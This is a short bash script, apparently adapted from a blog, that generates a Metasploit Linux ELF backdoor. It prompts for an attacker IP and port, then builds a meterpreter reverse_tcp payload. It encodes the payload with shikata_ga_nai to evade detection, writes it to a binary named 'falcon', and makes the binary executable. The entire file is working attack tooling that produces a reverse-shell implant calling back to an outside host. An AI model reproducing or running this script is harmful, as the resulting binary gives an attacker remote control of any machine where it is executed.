#!/bin/bash

#This is just script from http://astrobaby.wordpress.com
#Modified & Tested by falconflame a.k.a dr. F

#Enter the value of localhost and localport using read var method
clear
echo "*********************************************"
echo "  LINUX ELF BINARY GENERATOR FOR METASPLOIT  "
echo "*********************************************"
echo -e "What IP are we gonna use?: \c"
read IP
echo -e "What port number are we gonna listen to?: \c"
read port

#Below we choose a payload then import the localhost and localport from the value entered in the variable above
#Make it raw data, then by using pipeline we decrypt the payload using encoder
msfpayload linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$port R | msfencode -t elf -e x86/shikata_ga_nai >> falcon

#After the payload has been made, make it executable, then list it...
echo "falcon binary generated..."
chmod ug=rwx falcon
ls -la falcon
